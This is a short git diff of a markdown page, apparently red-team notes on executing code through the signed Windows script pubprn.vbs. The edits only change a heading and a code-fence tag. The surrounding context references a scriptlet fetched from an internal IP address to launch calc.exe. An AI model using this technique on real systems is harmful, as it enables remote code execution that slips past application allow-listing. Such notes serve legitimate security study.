@@ -4,7 +4,7 @@ description: >-
   pubprn.vbs
 ---
 
-# pubprn.vbs Signed Script Code Execution
+# Pubprn.vbs Signed Script Code Execution
 
 ## pubprn.vbs Signed Script Code Execution
 
@@ -13,7 +13,7 @@ description: >-
 Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml that will be executed by the script:
 
 {% code title="<http://192.168.2.71/tools/mitre/proxy-script/proxy.sct>" %}
-```markup
+```xml
 <?XML version="1.0"?>
 <scriptlet>
 
